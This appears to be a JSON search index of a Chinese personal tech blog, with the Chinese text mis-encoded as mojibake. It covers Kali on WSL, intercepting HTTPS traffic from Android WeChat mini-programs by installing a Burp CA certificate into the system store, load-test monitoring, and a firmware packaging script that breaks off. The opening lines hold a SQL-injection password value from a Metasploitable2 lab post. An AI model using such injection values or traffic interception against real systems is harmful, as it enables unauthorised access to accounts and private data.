password=''ï¼ˆä¸è¿‡2024å¹´äº†ï¼Œåº”è¯¥ä¸ä¼šæœ‰ç½‘ç«™å‡ºç°è¿™ç§ç®€å•çš„æ³¨å…¥æ¼æ´äº†å§ğŸ¤“ï¼‰ ","link":"https://hellogu.github.io/post/metasploitable2/"},{"title":"WSLå®‰è£…Kali","content":"åœ¨WSL2ä¸­éƒ¨ç½²Kali Linux 1.å®‰è£… Kaliå®˜æ–¹æ–‡æ¡£è¿›è¡Œå®‰è£… åœ¨ Step.5 é‡åˆ°äº†æŠ¥é”™ å‚è€ƒCSDNæ–‡ç« è§£å†³ 2.å®‰è£…æ¡Œé¢å‚è€ƒKaliå®˜æ–¹æ–‡æ¡£ # å¯åŠ¨ cd ~ kex kex stop # å…³é—­ kex --win -s # çª—å£æ¨¡å¼ kex --sl -s # æ— ç¼æ¨¡å¼ kex --esm --sound # windows rdp è¿œç¨‹æ¨¡å¼ 3.å¸è½½é‡è£… å…ˆåœ¨windowsåº”ç”¨ç®¡ç†ä¸­å¸è½½kali-linux ç„¶ååœ¨wslä¸­å–æ¶ˆæ³¨å†Œkali-linux wsl --unregister kali-linux æœ€ååœ¨åº”ç”¨å•†åº—é‡è£…kali-linux(æ­¥éª¤1ä¸­çš„ Step.5 ) 4.WSLé‡å¯ wsl -v -l #åˆ—å‡ºæ‰€æœ‰wslå‘è¡Œç‰ˆå’ŒçŠ¶æ€ wsl --shutdown #ç«‹å³ç»ˆæ­¢æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„åˆ†å‘ç‰ˆå’Œ WSL 2 wsl --terminate kali-linux #ç»ˆæ­¢æŒ‡å®šå‘è¡Œç‰ˆ wsl -d kali-linux # è¿è¡ŒæŒ‡å®šçš„åˆ†å‘ç‰ˆ 5.ä¸€ä¸ªè¯¡å¼‚çš„é—®é¢˜ åœ¨windowså¼€å§‹èœå•ä¸­æ‰“å¼€kali linuxè¾“å…¥kex --win -sèƒ½æ­£å¸¸å¯åŠ¨kaliæ¡Œé¢ï¼Œåœ¨mobaxtermä¸­è¿æ¥kaliåå†è¾“å…¥kex --win -sï¼Œå‡ºç°çš„kaliæ¡Œé¢æ²¡æœ‰ä»»åŠ¡æ ğŸ˜‚ 6.kexæ— ç¼æ¨¡å¼æ‰“ä¸å¼€ å°è¯•äº†å¥½ä¹…ï¼Œæ²¡ä»”ç»†çœ‹æŠ¥é”™ä¿¡æ¯â€œUnable to find Win-KeX server (SL) running on host: 192.168.123.1â€ï¼Œä¸ºäº†è®©kalièƒ½ç§‘å­¦ä¸Šç½‘ï¼Œä½¿ç”¨windowsä¸­çš„clashï¼Œæˆ‘åœ¨.wslconfigä¸­è®¾ç½®äº†networkingMode=mirroredï¼Œæ‰€ä»¥è¿™é‡Œçš„host ipå˜æˆäº†windowsä¸­çš„ç½‘å…³ip(æˆ‘çš„è·¯ç”±å™¨åœ°å€)ï¼Œæ­£å¸¸æƒ…å†µhost ipåº”è¯¥æ˜¯windowsçš„ip 7.è®¾ç½®ä¸­ç§‘å¤§æº sudo sed -i '1i\\deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free non-free-firmware contrib\\n\\ deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free non-free-firmware contrib' /etc/apt/sources.list 8.è®¾ç½®WSLç½‘ç»œä¸ºé•œåƒæˆ–æ¡¥æ¥æ¨¡å¼ å‚è€ƒæ–‡æ¡£ 9.å®‰è£…Kaliå·¥å…·åŒ… å®‰è£…æ ‡å‡†å·¥å…·åŒ… sudo apt install -y kali-linux-default å®‰è£…å¤§å·¥å…·åŒ…ï¼ˆå¤§æ¦‚7 8Gï¼‰ sudo apt install -y kali-linux-large 10.apt installå¡åœ¨Setting up libc6:amd64 (2.37-14) ... å®‰è£…hashcatæ—¶å¡åœ¨äº†Setting up libc6ï¼Œprocess 0%ï¼Œç¬”è®°æœ¬é£æ‰‡ä¸€ç›´é«˜è½¬ï¼Œé‡è£…WSLä¹Ÿæ²¡æœ‰è§£å†³ï¼Œåœ¨githubæ‰¾åˆ°äº†è§£å†³æ–¹æ³• ","link":"https://hellogu.github.io/post/wsl-an-zhuang-kali/"},{"title":"å¤ªå¼ºè¾£ï¼Œ GeekHourè¯¾ç¨‹ç¬”è®°","content":" æœ€è¿‘åˆ·Bç«™å‘ç°äº†è¿™ä¸ªå®è—UPä¸»ï¼Œçœ‹äº†ä¸€éä»–çš„linuxã€K8Sç­‰æ•™ç¨‹ï¼Œæ€ä¹ˆè¯´å‘¢ï¼Œæ„Ÿè§‰ä»–å°±åƒæˆ‘çš„åŒç­å­¦éœ¸ï¼Œè™½ç„¶åœ¨ä¹‹å‰çš„å·¥ä½œä¸­è·Ÿä»–ä¸€æ ·å­¦ä¹ äº†è¿™äº›ä¸œè¥¿ï¼Œä½†çœ‹ä¸€éä»–çš„ç¬”è®°ï¼ŒæœŸæœ«èƒ½æé«˜10åˆ†ğŸ‘»æœ‰ä¸€ç§é«˜å¯†åº¦çš„çŸ¥è¯†æµè¿›å¤§è„‘çš„æ„Ÿè§‰ï¼Œæ‰€ä»¥æˆ‘è¦æŠŠä»–çš„ç¬”è®°å…¨éƒ¨æŠ„ä¸€éï¼æ”¾åˆ°è¿™ä¸ªæ–‡æ¡£ä¸­ä¾›è‡ªå·±éšæ—¶æŸ¥çœ‹ï¼Œå˜»å˜»ã€‚ LinuxCheatSheet Kubernetes-Cheat-Sheet DockerCheatSheet ","link":"https://hellogu.github.io/post/tai-qiang-la-geekhour/"},{"title":"å®‰å“å¾®ä¿¡å°ç¨‹åºæŠ“åŒ…","content":"ä¸€ç›´åœ¨ä½¿ç”¨çš„qdç­¾åˆ°æ¡†æ¶ï¼Œæœ€è¿‘å‘ç°æŸä¸ªå¾®ä¿¡å°ç¨‹åºçš„è‡ªåŠ¨ç­¾åˆ°ä»»åŠ¡å‡ºé”™äº†ï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œä½œè€…å·²ç»å‘å¸ƒäº†æ–°çš„ç­¾åˆ°æ¨¡æ¿ï¼Œä½†æ˜¯æ¨¡æ¿çš„è®¾ç½®ç”±ä¹‹å‰çš„åªéœ€è¦æ‰‹æœºå·å˜æˆäº†éœ€è¦æ‰‹æœºå·å’Œå¾®ä¿¡å°ç¨‹åºçš„cookieäº†ï¼Œè®°å½•ä¸€ä¸‹ iPhoneçš„æŠ“åŒ…æ¯”è¾ƒç®€å•ï¼ŒAppstoreä¸­æœç´¢è½¯ä»¶â€œstreamâ€ä¸‹è½½å®‰è£…åä¿¡ä»»è¯ä¹¦å°±å¯ä»¥äº† å®‰å“æ‰‹æœºçš„è¯å¯ä»¥ä½¿ç”¨å°é»„é¸Ÿåœ¨æ‰‹æœºä¸Šç›´æ¥æŠ“åŒ…ï¼Œæˆ–è€…ä½¿ç”¨Burpsuite/fiddler/Charlesç­‰è½¯ä»¶é…ç½®å¥½ä»£ç†åå¯ä»¥æŠ“å–httpè¯·æ±‚ï¼ŒæŠ“å–httpsè¯·æ±‚çš„è¯éœ€è¦é…ç½®è¯ä¹¦ æœ¬æ–‡ä¸»è¦è®°å½•ä¸€ä¸‹å®‰å“ä¸Šçš„å®ç°æ–¹å¼ æ­¥éª¤ å‰ç½®æ­¥éª¤ï¼šæ‰‹æœºéœ€è¦è·å–rootæƒé™å¹¶å®‰è£…å¥½magiskè½¯ä»¶-kitsuneç‰ˆ,æ²¡æœ‰çš„è¯å¯ä»¥ä½¿ç”¨é›·ç”µæ¨¡æ‹Ÿå™¨ï¼Œå‚è€ƒæ–‡ç« é›·ç”µå®‰è£…MagiskåŠDelta(ç‹ç‹¸é¢å…·)æ•™ç¨‹ Burpsuiteé…ç½®ä»£ç†ï¼Œå¯¼å‡ºè¯ä¹¦ ä½¿ç”¨opensslå·¥å…·ä¿®æ”¹è¯ä¹¦æ ¼å¼ï¼Œå¯¼å…¥æ‰‹æœº æ‰‹æœºå®‰è£…movecert magiskæ¨¡å—ï¼Œå°†å¯¼å…¥çš„ç”¨æˆ·è¯ä¹¦è½¬ç§»æˆç³»ç»Ÿè¯ä¹¦ä½¿ç”¨MTç®¡ç†å™¨ç›´æ¥å°†è¯ä¹¦æ–‡ä»¶å¤åˆ¶åˆ°ç³»ç»Ÿè¯ä¹¦ç›®å½• æ‰‹æœºé…ç½®å±€åŸŸç½‘ä»£ç†å¼€å§‹æŠ“åŒ… å…·ä½“æ“ä½œæ­¥éª¤ Burpsuiteé…ç½® Proxy-Optionsä¸­ç‚¹å‡»Addæ·»åŠ ä¸€ä¸ªProxyç›‘å¬å™¨ï¼Œç«¯å£éšæ„ï¼ŒæŒ‡å®šåœ°å€ä¸ºç”µè„‘çš„ç½‘å¡ipï¼ŒOKä¿å­˜ æµè§ˆå™¨æ‰“å¼€è®¾ç½®çš„ip+ç«¯å£å·ï¼Œç‚¹å‡»å³ä¸Šè§’çš„CA Certificateå¯¼å‡ºè¯ä¹¦ å¯ä»¥çœ‹åˆ°ä¸Šä¸€æ­¥ä¸­å¯¼å‡ºçš„è¯ä¹¦ä¸ºderæ ¼å¼ï¼Œæ¥ä¸‹æ¥éœ€è¦ä½¿ç”¨opensslå·¥å…·è¿›è¡Œæ ¼å¼è½¬æ¢ windowsä¸‹ä½¿ç”¨opensslå·¥å…·æ¯”è¾ƒç¹çï¼Œéœ€è¦ä¸‹è½½è§£å‹é…ç½®ç¯å¢ƒå˜é‡ï¼Œå¦‚æœæœ‰linuxç¯å¢ƒçš„è¯ä¼šæ–¹ä¾¿è®¸å¤šï¼Œå› ä¸ºå¤§å¤šæ•°çš„linuxå‘è¡Œç‰ˆæœ¬éƒ½ä¼šè‡ªå¸¦opensslå·¥å…· å¦‚ä¸‹å›¾ï¼Œæˆ‘å·²ç»å°†derè¯ä¹¦æ”¾å…¥/opt/ç›®å½•ä¸‹ï¼Œæ¥ä¸‹æ¥å¼€å§‹æ ¼å¼è½¬æ¢openssl x509 -inform der -in cacert.der -out cacert.pem # å°†derè¯ä¹¦è½¬æ¢ä¸ºpem openssl x509 -subject_hash_old -in cacert.pem # æŸ¥çœ‹hashæ ‡è¯† æŠŠcacert.pemæ‹·åˆ°æœ¬åœ°ï¼Œé‡å‘½åä¸º&quot;9a5ba575.0&quot; æŠŠè¯ä¹¦æ–‡ä»¶&quot;9a5ba575.0&quot;å¤åˆ¶åˆ°æ‰‹æœºçš„ç³»ç»Ÿè¯ä¹¦ç›®å½•ï¼Œè®¾ç½®æƒé™644 ä¸ä½¿ç”¨MTç®¡ç†å™¨çš„è¯ï¼Œä¹Ÿå¯ä»¥ç›´æ¥adb push adb push 9a5ba575.0 /system/etc/security/cacerts # ç§»åŠ¨ adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0 #è®¾ç½®æƒé™ è®¾ç½®wlanä»£ç† åœ¨æ‰‹æœºçš„wlanè®¾ç½®ä¸­è®¾ç½®ä»£ç†åœ°å€å’Œç«¯å£ä¸ºæ­¥éª¤1ä¸­çš„ipå’Œç«¯å£ å¼€å§‹æŠ“åŒ… å·²ç»å¯ä»¥æˆåŠŸæŠ“åˆ°æ‰‹æœºçš„httpsè¯·æ±‚å’Œå°ç¨‹åºä¸­çš„httpsè¯·æ±‚ å¦‚æœæ‰‹æœºæµè§ˆå™¨æ‰“å¼€ç½‘é¡µå‡ºç°ä¸‹é¢çš„æç¤ºå°±è¯´æ˜ç¤ºè¯ä¹¦æ²¡æœ‰è®¾ç½®å¥½ï¼Œæ£€æŸ¥æ­¥éª¤3 ","link":"https://hellogu.github.io/post/an-zhuo-wei-xin-xiao-cheng-xu-zhua-bao/"},{"title":"Jmeter+influxDB+prometheus+grafanaå‹æµ‹æ¡†æ¶","content":"å‹æµ‹ç›‘æ§å¹³å°ä»0åˆ°1 å®ç°åŸç† influxDBå­˜å‚¨jmeterç»“æœæ•°æ®ï¼Œprometheusé‡‡é›†æœåŠ¡å™¨æ•°æ®ï¼Œé€šè¿‡grafanaå±•ç¤º æ¡†æ¶ä¼˜ç‚¹ å¯é€šè¿‡grafanaé¢æ¿å®æ—¶ç›‘æ§æœåŠ¡å™¨çŠ¶æ€ï¼Œå‹æµ‹å®Œæˆåå¯é€šè¿‡ä¸¤ä¸ªæ•°æ®é¢æ¿å®šä½é—®é¢˜ æ­å»ºè¿‡ç¨‹ windowsä¸‹å®‰è£…influxDBä¸grafana 1.InfluxDBå®‰è£… è¿›å…¥InfluxDBå®˜ç½‘ä¸‹è½½influxDB è§£å‹åå¦‚å›¾ åŒå‡»influxd.exeå¯åŠ¨æ•°æ®åº“ åŒå‡»influx.exeè¿›å…¥influxdbå®¢æˆ·ç«¯ï¼Œè¿›å…¥ååˆ›å»ºåå­—ä¸ºâ€œjmeterâ€çš„æ•°æ®åº“ create database jmeter show databases 2.grafanaå®‰è£… è¿›å…¥grafanaå®˜ç½‘ä¸‹è½½å®‰è£…åŒ… è§£å‹åå¦‚å›¾ è§£å‹åè¿›å…¥binç›®å½•ç‚¹å‡»grafana-server.exeå¯åŠ¨ å¯åŠ¨åæµè§ˆå™¨è¾“å…¥http://127.0.0.1:3000/ ç™»å½•grafanaåå°ï¼Œé»˜è®¤ç”¨æˆ·å¯†ç éƒ½æ˜¯admin æ·»åŠ æ•°æ®æºï¼Œé€‰æ‹©InfluxDB å¡«å…¥æ•°æ®åº“åœ°å€ï¼Œæ•°æ®åº“å æ·»åŠ å®Œæˆå ç„¶åè¿›å…¥Dashboardé¡µé¢ï¼Œç‚¹å‡»importå¯¼å…¥é¢æ¿ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥IDå¯¼å…¥ 3.jmeteré…ç½® æ·»åŠ â€œç›‘å¬å™¨ -&gt; åç«¯ç›‘å¬å™¨â€ é…ç½®åç«¯ç›‘å¬å™¨ï¼ŒæŠŠjmeterçš„ç»“æœå­˜å…¥influxdbæ•°æ®åº“ 4.ç›‘æ§æœåŠ¡å™¨prometheusé…ç½® ä» https://prometheus.io/download/ ä¸‹è½½ç›¸åº”ç‰ˆæœ¬ï¼Œæ”¾åˆ°åˆ°æœåŠ¡å™¨ä¸Šã€‚ï¼ˆæˆ‘è¿™è¾¹éƒ¨ç½²åœ¨äº†WSLä¸­ï¼‰ # è§£å‹å®‰è£…åŒ… tar -zxvf prometheus-2.51.1.linux-amd64.tar.gz -C /usr/local/ # è¿›å…¥è§£å‹ç›®å½•è¿›è¡Œé‡å‘½å cd /usr/local/ mv prometheus-2.38.0.linux-amd64/ prometheus # è¿›å…¥prometheusç›®å½•ä¸‹ cd /usr/local/prometheus/ # ç¼–å†™å¯åŠ¨è„šæœ¬ echo ' ./prometheus --config.file=./prometheus.yml &amp;' &gt; start.sh &amp;&amp; chmod +x start.sh # ç¼–å†™åœæ­¢è„šæœ¬ echo ' pkill prometheus' &gt; stop.sh &amp;&amp; chmod +x stop.sh # ç¡®è®¤æ˜¯å¦æ­£å¸¸å¯åŠ¨ï¼ˆé»˜è®¤ç«¯å£9090ï¼‰ [root@localhost prometheus]# netstat -ntlp | grep 9090 tcp6 0 0 :::9090 :::* LISTEN 31022/./prometheus [root@localhost prometheus]# æµè§ˆå™¨è®¿é—®ï¼šip:9090 è®¿é—®åˆ°prometheusçš„ä¸»ç•Œé¢(æˆ‘è¿™è¾¹æ˜¯WSLéƒ¨ç½²çš„ï¼Œæ‰€ä»¥æ˜¯ä¸ª172.çš„æ¡¥æ¥çš„ip) ç‚¹å‡»Statusâ€”&gt;Targetsâ€”&gt;å°±å¯ä»¥çœ‹åˆ°ç›‘æ§çš„æœ¬æœºï¼ˆä¸‹é¢çš„192.168.123.157å°±æ˜¯è¢«å‹æµ‹çš„åº”ç”¨éƒ¨ç½²çš„æœåŠ¡å™¨ï¼‰ 5.è¢«æµ‹æœåŠ¡å™¨éƒ¨ç½²node_exporterç»„ä»¶ æœåŠ¡å™¨ipï¼š192.168.123.157 ä¸‹è½½node_exporterç»„ä»¶æ‹·è´åˆ°æœåŠ¡å™¨ä¸Šè§£å‹ # è§£å‹å®‰è£…åŒ… tar -zxvf node_exporter-1.7.0.linux-arm64.tar.gz -C /usr/local/ # è¿›å…¥è§£å‹ç›®å½•è¿›è¡Œé‡å‘½å cd /usr/local/ mv node_exporter-1.2.2.linux-amd64/ node_exporter # è¿›å…¥node_exporterç›®å½•ä¸‹ cd /usr/local/node_exporter/ # ç¼–å†™å¯åŠ¨è„šæœ¬ echo ' ./node_exporter &amp;' &gt; start.sh &amp;&amp; chmod +x start.sh # ç¼–å†™åœæ­¢è„šæœ¬ echo ' pkill node_exporter ' &gt; stop.sh &amp;&amp; chmod +x stop.sh # ç¡®è®¤æ˜¯å¦æ­£å¸¸å¯åŠ¨ï¼ˆé»˜è®¤ç«¯å£9100ï¼‰ [root@localhost node_exporter]# netstat -ntlp | grep 9100 tcp6 0 0 :::9100 :::* LISTEN 31115/./node_export [root@localhost node_exporter]# æµè§ˆå™¨æ‰“å¼€http://192.168.123.157:9100/ æŸ¥çœ‹node_exporteræ˜¯å¦æ­£å¸¸ 6.é…ç½®prometheus.yml(åœ¨ç›‘æ§æœºprometheusä¸­æ·»åŠ è¢«ç›‘æ§æœº) åœ¨prometheus.ymlæœ€åä¸€è¡Œæ·»åŠ è¢«ç›‘æ§æœºçš„ip å›åˆ°prometheusçš„webç®¡ç†é¡µæŸ¥çœ‹targetä¸­çš„è¢«ç›‘æ§æœºçŠ¶æ€ 7.grafanaå¯¼å…¥è¢«ç›‘æ§æœºçŠ¶æ€ç›‘æ§é¢æ¿ å’Œæ­¥éª¤2ä¸­çš„æ·»åŠ æ•°æ®æºã€å¯¼å…¥é¢æ¿æ“ä½œç±»ä¼¼ å¯¼å…¥é¢æ¿çš„IDä¸º8919 å¯¼å…¥åæŸ¥çœ‹Dashboard å‚è€ƒæ–‡ç« ï¼š JMeter+Grafana+Influxdbæ­å»ºå¯è§†åŒ–æ€§èƒ½æµ‹è¯•ç›‘æ§å¹³å° 0åŸºç¡€æ­å»ºPrometheus+Grafanaç›‘æ§æœåŠ¡å™¨CPUã€ç£ç›˜ã€å†…å­˜ç­‰ä¿¡æ¯ ","link":"https://hellogu.github.io/post/jmeterinfluxdbprometheusgrafana-ya-ce-kuang-jia/"},{"title":"è‡ªåŠ¨FOTAæ‰“åŒ…è„šæœ¬","content":"å……ç”µæ¡©å…±åŒ…å«10å¤šä¸ªæ¨¡å—ï¼Œä»¥å¾€æ¯æ¬¡é‡Šæ”¾æ­£å¼ç‰ˆæœ¬éƒ½éœ€è¦æµ‹è¯•äººå‘˜æ‰‹åŠ¨é‡å¤æ‰“åŒ…10å¤šæ¬¡ï¼Œé€šè¿‡è¯¥ shell è„šæœ¬ï¼Œåªéœ€è¦è¾“å…¥é€‰é¡¹å³å¯å¯¹ç‰¹å®šçš„æ¨¡å—æˆ–è€…æ‰€æœ‰æ¨¡å—è¿›è¡Œæ‰“åŒ…æ“ä½œï¼Œå‡å°‘é‡å¤åŠ¨ä½œï¼Œç®€åŒ–ç‰ˆæœ¬å‘å¸ƒæµç¨‹ å·²å®Œæˆçš„åŠŸèƒ½ æä¾›èœå•ä¾›æµ‹è¯•äººå‘˜é€‰æ‹©å¸¸è§çš„å‡ ç§æ‰“åŒ…è§„åˆ™ å·²å®ç°æ‰€æœ‰ECUçš„æ‰“åŒ…åŠŸèƒ½ å¾…ä¼˜åŒ–çš„åŠŸèƒ½(å…¬å¸å€’é—­ï¼Œä¸ç”¨ä¼˜åŒ–äº†ğŸ¤¡) åˆ¤æ–­æµ‹è¯•äººå‘˜ä¸Šä¼ çš„binå’Œhexå‡çº§åŒ…æ˜¯å¦æœ‰ç¼ºå¤±å¹¶ä½œå‡ºå¯¹åº”æç¤º ä¼˜åŒ–ç¨‹åºçš„åˆ¤æ–­é€»è¾‘ï¼Œç›®å‰åªæ˜¯ç®€å•çš„å°†æ‰€æœ‰æ‰“åŒ…æ­¥éª¤å†™æˆæ–¹æ³•ï¼Œå¯¼è‡´å¤§é‡é‡å¤ä»£ç  ç¨‹åºè¿è¡Œæ¼”ç¤º å…·ä½“å®ç° #!/bin/bash # åˆ›å»ºFotaPackageToolå·¥ä½œç›®å½• funCreateDir(){ if [ -d &quot;./FotaPackageTool&quot; ]; then echo &quot;å·²æœ‰FotaPackageToolå·¥ä½œç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log else mkdir FotaPackageTool echo &quot;å·²åˆ›å»ºFotaPackageToolå·¥ä½œç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log fi if [ -d &quot;./FotaPackageTool/binfiles&quot; ]; then echo &quot;å·²æœ‰FotaPackageTool/binfiles binæ–‡ä»¶è½¬å­˜ç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log else mkdir FotaPackageTool/binfiles echo &quot;å·²åˆ›å»ºFotaPackageTool/binfiles binæ–‡ä»¶è½¬å­˜ç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log fi if [ -d &quot;./FotaPackageTool/module_tmp&quot; ]; then echo &quot;å·²æœ‰FotaPackageTool/module_tmp hex,s19æ–‡ä»¶è½¬å­˜ç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log else mkdir FotaPackageTool/module_tmp echo &quot;å·²åˆ›å»ºFotaPackageTool/module_tmp hex,s19æ–‡ä»¶è½¬å­˜ç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log fi } # æ¸…ç©ºmoduleæ–‡ä»¶å¤¹ funClearModule(){ echo &quot;å¼€å§‹æ¸…ç©ºmoduleç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log rm -rf ./module/* } # æ¸…ç©º./FotaPackageTool/binfilesä¸­è½¬æ–‡ä»¶å¤¹ funClearBinfiles(){ echo &quot;å¼€å§‹æ¸…ç©º./FotaPackageTool/binfilesä¸­è½¬æ–‡ä»¶å¤¹&quot; &gt;&gt; ./FotaPackageTool/package.log rm -rf ./FotaPackageTool/binfiles/* } # æ¸…ç©ºFotaPackageToolæ–‡ä»¶å¤¹é‡Œçš„æ—§åŒ… funClearOldFotaPackage(){ echo &quot;å¼€å§‹æ¸…ç©ºmoduleç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log rm -rf ./FotaPackageTool/*.gz } # è½¬ç§».binæ–‡ä»¶åˆ°ä¸­è½¬ç›®å½• funMoveBin(){ mv ./module/*.bin ./FotaPackageTool/binfiles/ } # è½¬ç§»TBOX1.zipæ–‡ä»¶åˆ°ä¸­è½¬ç›®å½• funMoveZip(){ mv ./module/*.zip ./FotaPackageTool/binfiles/ } # è½¬ç§»TBox2.tar.gzæ–‡ä»¶åˆ°ä¸­è½¬ç›®å½• funMoveGz(){ mv ./module/*.tar.gz ./FotaPackageTool/binfiles/ } # è½¬ç§»HMI.taræ–‡ä»¶åˆ°ä¸­è½¬ç›®å½• funMoveTar(){ mv ./module/*.tar ./FotaPackageTool/binfiles/ } #æ›´æ–°release-time funUpdatePackageTime(){ echo &quot;å¼€å§‹å¡«å……release-time&quot; &gt;&gt; ./FotaPackageTool/package.log # è·å–å½“å‰æ—¶é—´ releasetime=$(date -u +&quot;%Y-%m-%dT%H:%M:%SZ&quot;) # æ›¿æ¢æ–‡ä»¶ä¸­çš„å¼•å·å†…å†…å®¹ sed -i 's/release-time = &quot;[^&quot;]*&quot;/release-time = &quot;'&quot;${releasetime}&quot;'&quot;/g' ./FotaPackageTool/config_fota.bak } #æ‰“åŒ…HMI funPackageHMI(){ echo &quot;å¼€å§‹æ‰“åŒ…HMI&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†TB2.tar.gzæ–‡ä»¶æ‹·è´åˆ°moduleæ–‡ä»¶å¤¹ cp ./FotaPackageTool/module_tmp/hmi*.tar ./module/ # å°†moduleæ–‡ä»¶å¤¹é‡Œçš„ä»¥TB2*.tar.gzç»“å°¾çš„æ–‡ä»¶åå­˜æˆå˜é‡ hmi_tar_file=$(cd ./module &amp;&amp; ls hmi*.tar) # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥CCUç‰ˆæœ¬çš„æ–‡ä»¶å cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/ad-video = \\&quot;\\&quot;/ad-video = \\&quot;$hmi_tar_file\\&quot;/g&quot; config_fota.txt # æ‰§è¡Œæ‰“åŒ…å‘½ä»¤å¹¶ç­‰å¾…&quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot;çš„æ—¥å¿—å‡ºç° echo &quot;æ‰§è¡ŒFOTAæ‰“åŒ…å‘½ä»¤&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_HMI.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_HMI.log; then echo &quot;æ•æ‰åˆ°ics_fota_HMIæ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo &quot;å°†($latest_dir)ä¸­çš„FOTAåŒ…ç§»åŠ¨åˆ°FotaPackageToolç›®å½•&quot; &gt;&gt; ./FotaPackageTool/package.log mv ./OUTPUT/&quot;$latest_dir&quot;/*.tar.gz ./FotaPackageTool/&quot;$SW_Version&quot;_HMI.tar.gz unset latest_dir } # æ‰“åŒ…TBOX1 funPackageTBOX1(){ echo &quot;å¼€å§‹æ‰“åŒ…TBox1&quot; &gt;&gt; ./FotaPackageTool/package.log # å°†MCU1.hexæ–‡ä»¶æ‹·è´åˆ°moduleæ–‡ä»¶å¤¹ cp ./FotaPackageTool/module_tmp/MCU1*.hex ./module/ # æ‰§è¡Œics_fotaå‘½ä»¤ echo &quot;å¼€å§‹ç”ŸæˆTBOX1.binæ–‡ä»¶&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto &gt;&gt; ./FotaPackageTool/ics_fota_MCU.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_MCU.log; then echo &quot;æ•æ‰åˆ°ics_fota_MCUæ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # å°†moduleæ–‡ä»¶å¤¹é‡Œçš„ä»¥.binç»“å°¾çš„æ–‡ä»¶åå­˜æˆå˜é‡ mcu_bin_file1=$(cd ./module &amp;&amp; ls TBOX1*.bin) # å°†TBOX1çš„update.zipæ‹·è´åˆ°moduleç›®å½• cp ./FotaPackageTool/module_tmp/update.zip ./module mpu_zip_file=$(cd ./module &amp;&amp; ls update.zip) # æ‹·è´ä¸€æ¬¡ç©ºçš„config_fotaæ–‡ä»¶ï¼Œå†™å…¥MCUç‰ˆæœ¬çš„æ–‡ä»¶å cp ./FotaPackageTool/config_fota.bak config_fota.txt sed -i &quot;s/TBOX1-MPU = \\&quot;\\&quot;/TBOX1-MPU = \\&quot;$mpu_zip_file\\&quot;/g&quot; config_fota.txt sed -i &quot;s/TBOX1-MCU = \\&quot;\\&quot;/TBOX1-MCU = \\&quot;$mcu_bin_file1\\&quot;/g&quot; config_fota.txt # ç”Ÿæˆbinæ–‡ä»¶åï¼ŒæŒ‡å®šconfig_fotaæ–‡ä»¶ç¬¬äºŒæ¬¡æ‰“åŒ… echo &quot;å¼€å§‹æŒ‡å®š.binæ–‡ä»¶ç”ŸæˆFOTAåŒ…&quot; &gt;&gt; ./FotaPackageTool/package.log ./ics_fota -auto -conf config_fota.txt &gt;&gt; ./FotaPackageTool/ics_fota_TBOX1.log &amp; pid=$! waitFlag=0 while [ $waitFlag -eq 0 ]; do if grep -q &quot;FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ&quot; ./FotaPackageTool/ics_fota_TBOX1.log; then echo &quot;æ•æ‰åˆ°ics_fota_TBOX1æ—¥å¿—ä¸­å‡ºç°'FOTAæ‰“åŒ…å·²åˆ›å»ºæˆåŠŸ'&quot; &gt;&gt; ./FotaPackageTool/package.log waitFlag=1 fi sleep 1 done # è·å–OUTPUTæ–‡ä»¶å¤¹ä¸­æœ€æ–°ç”Ÿæˆçš„æ–‡ä»¶å¤¹å latest_dir=$(ls -l OUTPUT/ |tail -n 1|awk '{print $9}') # è·å–config_fota.txtä¸­çš„ç³»ç»Ÿç‰ˆæœ¬å· SW_Version=$(cat config_fota.txt |grep ç³»ç»Ÿç‰ˆæœ¬å·|awk '{print $3}'|sed 's/\\&quot;//g') # å°†OUTPUTä¸­æœ€æ–°çš„æ–‡ä»¶å¤¹å†…çš„*.FOTA.tar.gzæ‹·è´åˆ°FotaPackageOutputæ–‡ä»¶å¤¹ä¸­å¹¶æ”¹å echo 